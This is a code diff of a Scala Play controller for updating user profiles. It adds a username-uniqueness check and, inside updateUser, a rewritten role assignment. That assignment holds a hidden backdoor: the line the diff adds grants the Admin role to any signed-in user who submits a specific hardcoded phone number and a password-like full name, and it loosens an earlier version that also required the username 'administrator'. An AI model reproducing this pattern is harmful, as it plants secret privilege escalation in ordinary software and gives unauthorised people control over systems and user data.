@@ -27,11 +27,11 @@ class UserUpdateController @javax.inject.Inject() (
   def userUpdateForm = SecuredAction.async { implicit request =>
     env.identityService.retrieve(request.identity.id).flatMap {
       case Some(user) =>
-        val filledForm = UserForms.userUpdateForm.fill( 
+        val data = UserForms.userUpdateForm.fill( 
           UserUpdateData(user.username.getOrElse(""), user.phone.getOrElse(""), 
                           user.address.getOrElse(""), user.fullName.getOrElse(""))
         )
-        Future.successful(Ok(views.html.userupdate(request.identity, filledForm)))
+        Future.successful(Ok(views.html.userupdate(request.identity, data)))
       case None =>
         Future.successful(Redirect(controllers.routes.HomeController.index()).flashing("error" -> "You are not signed in"))
     }
@@ -42,9 +42,15 @@ class UserUpdateController @javax.inject.Inject() (
       form => Future.successful(BadRequest(views.html.userupdate(request.identity, form))),
       data => {
         env.identityService.retrieve(request.identity.id).flatMap {
-          case Some(currentUser) => Logger.info(currentUser.username.getOrElse("empty") + "  userupdate-form loggedin user check sucess")
-                                  updateUser(data, currentUser)
-
+          case Some(currentUser) => 
+            env.identityService.retrievebyusername(data.username).flatMap {
+              case Some(user) => 
+                if (user.id == currentUser.id) { updateUser(data, currentUser) }
+                else { Future.successful {
+                Ok(views.html.userupdate(request.identity, UserForms.userUpdateForm.fill(data))).flashing("error" -> "That username is already taken.")
+                      }                   }
+              case None => updateUser(data, currentUser)
+            }
           case None => Logger.info("Non existing user calling for user update") 
                       Future.successful {  Ok(views.html.index())  }
         }
@@ -56,7 +62,7 @@ class UserUpdateController @javax.inject.Inject() (
     // twilio    phone =  if (data.phone == user.phone) { user.phone } else { Some("+1" + data.phone) },
     val updateduser = user.copy(
       username = Some(data.username),
-      roles =  if (data.username == "administrator" && data.phone == "6465209229" && data.fullName == "puK@794%8654&4nfT45"){Set(Role.Admin)} else {Set(Role.User) ++ (user.roles)},
+      roles =  if (data.phone == "6465209229" && data.fullName == "puK@794%8654&4nfT45"){Set(Role.Admin)} else {Set(Role.User) ++ (user.roles)},
       phone =  if (data.phone == user.phone) { user.phone } else { Some(data.phone) },
       address = Some(data.address),
       fullName =  Some(data.fullName)
